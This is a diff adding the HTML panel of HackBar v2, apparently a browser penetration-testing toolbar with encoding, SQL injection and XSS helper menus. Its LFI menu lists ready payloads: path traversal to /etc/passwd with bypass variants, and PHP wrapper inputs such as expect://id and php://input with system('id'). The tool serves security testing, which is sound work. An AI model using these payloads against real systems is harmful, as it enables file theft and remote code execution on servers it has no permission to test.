@@ -1,0 +1,291 @@
+<!DOCTYPE html>
+
+<html>
+<head>
+	<meta charset="utf-8">
+	<link rel="stylesheet" href="css/bootstrap.min.css"/>
+	<link rel="stylesheet" href="css/font-awesome-all.min.css"/>
+	<link rel="stylesheet" href="css/style.css"/>
+</head>
+<body>
+	<div class="container-fluid" style="padding-top: 5px;">
+		<nav class="navbar navbar-default">
+			<div class="collapse navbar-collapse">
+				<ul class="nav navbar-nav" tabindex="-1" id="menu_btn">
+					<li class="dropdown">
+						<a href="#" tabindex="-1" class="dropdown-toggle" data-toggle="dropdown" role="button"
+						aria-haspopup="true" aria-expanded="false">Encryption <span class="caret"></span></a>
+						<ul class="dropdown-menu">
+							<li><a href="#" id='md5'><i class="fa fa-lock"></i> MD5</a></li>
+							<li><a href="#" id='sha1'><i class="fa fa-lock"></i> SHA-1</a></li>
+							<li><a href="#" id='sha256'><i class="fa fa-lock"></i> SHA-256</a></li>
+							<li><a href="#" id='rot13'><i class="fa fa-unlock"></i> ROT13</a></li>
+						</ul>
+					</li>
+					<li class="dropdown">
+						<a href="#" tabindex="-1" class="dropdown-toggle" data-toggle="dropdown" role="button"
+						aria-haspopup="true" aria-expanded="false">Encoding <span class="caret"></span></a>
+						<ul class="dropdown-menu">
+							<li><a href="#" id='base64_encode'><i class="fa fa-exchange-alt"></i> Base64 Encode</a></li>
+							<li><a href="#" id='base64_decode'><i class="fa fa-history"></i> Base64 Decode</a></li>
+							<li><a href="#" id='url_encode'><i class="fa fa-link"></i> URL Encode</a></li>
+							<li><a href="#" id='url_decode'><i class="fa fa-unlink"></i> URL Decode</a></li>
+							<li><a href="#" id='hex_encode'><i class="fa fa-exchange-alt"></i> Hex Encode</a></li>
+							<li><a href="#" id='hex_decode'><i class="fa fa-history"></i> Hex Decode</a></li>
+						</ul>
+					</li>
+
+					<li class="dropdown">
+						<a href="#" tabindex="-1" class="dropdown-toggle" data-toggle="dropdown" role="button"
+						aria-haspopup="true" aria-expanded="false">SQL <span class="caret"></span></a>
+						<ul class="dropdown-menu">
+							<li class="dropdown-submenu">
+								<a href="#">Char</span></a>
+								<ul class="dropdown-menu">
+									<li><a href="#" id='sql_mysql_char'><i class="fa fa-database"></i> MySQL CHAR()</a></li>
+									<li><a href="#" id='sql_mssql_char'><i class="fa fa-database"></i> MSQL CHAR()</a></li>
+									<li><a href="#" id='sql_oracle_char'><i class="fa fa-database"></i> Oracle CHAR()</a></li>
+								</ul>
+							</li>
+							<li class="dropdown-submenu">
+								<a href="#">MySQL</span></a>
+								<ul class="dropdown-menu">
+									<li><a href="#" id='sql_basic_info_column'><i class="fa fa-database"></i> Basic info column</a></li>
+									<li><a href="#" id='sql_convert_latin1'><i class="fa fa-exchange-alt"></i> Convert using Latin-1</a></li>
+									<li><a href="#" id='sql_convert_utf8'><i class="fa fa-exchange-alt"></i> Convert using UTF-8</a></li>
+								</ul>
+							</li>
+							<li class="dropdown-submenu">
+								<a href="#">Union</span></a>
+								<ul class="dropdown-menu">
+									<li><a href="#" id='sql_union_statement'><i class="fa fa-database"></i> Union Select Statment</a>
+									<li><a href="#" id='sql_union_all_select'><i class="fa fa-database"></i> Union All Select Statment</a></li>
+									<li><a href="#" id='sql_union_all_select_null'><i class="fa fa-database"></i> Union All Select NULL Statment</a></li>
+								</ul>
+							</li>
+							<li><a href="#" id='sql_spaces_to_inline_comments'><i class="fa fa-database"></i> Spaces to inline comments</a></li>
+						</ul>
+					</li>
+
+					<li class="dropdown">
+						<a href="#" tabindex="-1" class="dropdown-toggle" data-toggle="dropdown" role="button"
+						aria-haspopup="true" aria-expanded="false">XSS <span class="caret"></span></a>
+						<ul class="dropdown-menu">
+							<li><a href="#" id='xss_string_from_charcode'><i class="fab fa-js-square"></i> String.fromCharCode</a>
+							</li>
+							<li><a href="#" id='xss_html_characters'><i class="fab fa-html5"></i> HTML Characters</a></li>
+							<li><a href="#" id='xss_alert'><i class="fa fa-exclamation-triangle"></i> XSS Alert</a></li>
+						</ul>
+					</li>
+
+					<li class="dropdown" id="lfi">
+						<a href="#" tabindex="-1" class="dropdown-toggle" data-toggle="dropdown" role="button"
+						aria-haspopup="true" aria-expanded="false">LFI <span class="caret"></span></a>
+						<ul class="dropdown-menu">
+							<li class="dropdown-submenu">
+								<a href="#">Basic</span></a>
+								<ul class="dropdown-menu">
+									<li class="dropdown-submenu">
+										<a href="#">Basic LF</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=../../../etc/passwd</a></li>
+										</ul>
+									</li>
+
+									<li class="dropdown-submenu">
+										<a href="#">Null byte</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=../../../etc/passwd%00</a></li>
+										</ul>
+									</li>
+
+									<li class="dropdown-submenu">
+										<a href="#">Double encoding</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=%252e%252e%252fetc%252fpasswd</a></li>
+											<li><a href="#" class="lfi_data">?page=%252e%252e%252fetc%252fpasswd%00</a></li>
+										</ul>
+									</li>
+
+									<li class="dropdown-submenu">
+										<a href="#">Path and dot truncation</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=../../../etc/passwd............[ADD MORE]</a></li>
+											<li><a href="#" class="lfi_data">?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]</a></li>
+											<li><a href="#" class="lfi_data">?page=../../../etc/passwd/./././././.[ADD MORE]</a></li>
+											<li><a href="#" class="lfi_data">?page=../../../[ADD MORE]../../../../etc/passwd</a></li>
+										</ul>
+									</li>
+
+									<li class="dropdown-submenu">
+										<a href="#">Filter bypass tricks</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=....//....//etc/passwd</a></li>
+											<li><a href="#" class="lfi_data">?page=..///////..////..//////etc/passwd</a></li>
+											<li><a href="#" class="lfi_data">?page=../../../etc/passwd/./././././.[ADD MORE]</a></li>
+											<li><a href="#" class="lfi_data">?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd</a></li>
+										</ul>
+									</li>
+								</ul>
+							</li>
+
+							<li class="dropdown-submenu">
+								<a href="#">Using wrappers</span></a>
+								<ul class="dropdown-menu">
+									<li class="dropdown-submenu">
+										<a href="#">php://filter</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=php://filter/read=string.rot13/resource=index.php</a></li>
+											<li><a href="#" class="lfi_data">?page=php://filter/convert.base64-encode/resource=index.php</a></li>
+											<li><a href="#" class="lfi_data">?page=pHp://FilTer/convert.base64-encode/resource=index.php</a></li>
+										</ul>
+									</li>
+
+									<li class="dropdown-submenu">
+										<a href="#">zip://</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=zip://shell.jpg%23payload.php</a></li>
+										</ul>
+									</li>
+
+									<li class="dropdown-submenu">
+										<a href="#">data://</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=data://text/plain;base64,[base64_encode_shell]</a></li>
+										</ul>
+									</li>
+
+									<li class="dropdown-submenu">
+										<a href="#">expect://</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=expect://id</a></li>
+											<li><a href="#" class="lfi_data">?page=expect://ls</a></li>
+										</ul>
+									</li>
+
+									<li class="dropdown-submenu">
+										<a href="#">input://</span></a>
+										<ul class="dropdown-menu">
+											<li><a href="#" class="lfi_data">?page=php://input | POST DATA: <?php system('id'); ?></a></li>
+										</ul>
+									</li>
+								</ul>
+							</li>
+						</ul>
+					</li>
+
+					<li class="dropdown">
+						<a href="#" tabindex="-1" class="dropdown-toggle" data-toggle="dropdown" role="button"
+						aria-haspopup="true" aria-expanded="false">XXE <span class="caret"></span></a>
+						<ul class="dropdown-menu">
+							<li><a href="#" id='sql_mysql_char'>Comming soon</a></li>
+						</ul>
+					</li>
+
+					<li class="dropdown">
+						<a href="#" tabindex="-1" class="dropdown-toggle" data-toggle="dropdown" role="button"
+						aria-haspopup="true" aria-expanded="false">Other <span class="caret"></span></a>
+						<ul class="dropdown-menu">
+							<li><a href="#" id='jsonify'><img src="img/addslashes.png"/> Jsonify</a></li>
+							<li><a href="#" id='uppercase'><img src="img/uppercase.png"/> Uppercase</a></li>
+							<li><a href="#" id='lowercase'><img src="img/lowercase.png"/> Lowercase</a></li>
+						</ul>
+					</li>
+				</ul>
+				<ul class="nav navbar-nav navbar-right">
+					<p class="navbar-text">
+						<a href="https://github.com/Hack-Free/HackBar" target="_blank">Commit now!</a>
+						HackBar v2
+					</p>
+				</ul>
+			</div><!-- /.navbar-collapse -->
+		</nav>
+		<div class="row">
+			<div class="col-md-2 col-lg-1 col-xs-3 col-sm-3">
+				<button class="btn btn-sm btn-block btn-default" id="load_url"><i class="fa fa-cloud-download-alt fa-lg"></i> Load URL
+				</button>
+				<button class="btn btn-sm btn-block btn-default" id="split_url"><i class="fa fa-cut fa-lg"></i> Split URL
+				</button>
+				<button class="btn btn-sm btn-block btn-default" id="execute"><i class="far fa-play-circle fa-lg"></i> Execute
+				</button>
+			</div>
+			<div class="col-md-10 col-lg-11 col-xs-9 col-sm-9">
+				<div class="form-group">
+					<textarea id="url_field" class="form-control"></textarea>
+				</div>
+				<div class="form-group">
+					<div class="checkbox">
+						<label class="checkbox-inline">
+							<input type="checkbox" id="enable_post_btn"/> Post data
+						</label>
+						<label class="checkbox-inline">
+							<input type="checkbox" id="enable_referer_btn"/> Referer
+						</label>
+						<label class="checkbox-inline">
+							<input type="checkbox" id="enable_user_agent_btn"/> User Agent
+						</label>
+						<label class="checkbox-inline">
+							<input type="checkbox" id="enable_cookie_btn"/> Cookies
+						</label>
+						<label class="checkbox-inline">
+							<a id="clear_all">Clear All</a>
+						</label>
+					</div>
+				</div>
+
+			</div>
+		</div>
+		<div class="row">
+			<div class="col-lg-1" id="data_label_block">
+			</div>
+			<div class="col-lg-6 block">
+				<div class="form-group">
+					<textarea id="post_data_field" class="form-control"></textarea>
+				</div>
+			</div>
+			<div class="col-lg-5">
+				<div class="form-group block">
+					<div class="input-group">
+						<div class="input-group-addon"><strong>R</strong></div>
+						<input type="text" class="form-control" id="referer_field" placeholder="Referer">
+					</div>
+				</div>
+
+				<div class="form-group block">
+					<div class="input-group">
+						<div class="input-group-addon"><strong>U</strong></div>
+						<input type="text" class="form-control" id="user_agent_field" placeholder="User Agent">
+					</div>
+				</div>
+
+				<div class="form-group block">
+					<div class="input-group">
+						<div class="input-group-addon"><strong>C</strong></div>
+						<input type="text" class="form-control" id="cookie_field" placeholder="Cookies">
+					</div>
+				</div>
+			</div>
+		</div>
+		<!-- Modal -->
+		<div class="modal" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+			<div class="modal-dialog modal-sm" role="document">
+				<div class="modal-content">
+					<div class="modal-header">Please enter some text</div>
+					<div class="modal-body">
+						<div class="form-group">
+							<input type="text" class="form-control" placeholder="Please enter some text">
+						</div>
+						<button class="btn btn-primary">OK</button>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+	<script src="js/jquery-3.4.0.slim.min.js"></script>
+	<script src="js/bootstrap.min.js"></script>
+	<script src="js/Encrypt.js"></script>
+	<script src="js/XSS.js"></script>
+	<script src="js/SQL.js"></script>
+	<script src="js/hackbar-panel.js"></script>
+</body>
+</html>
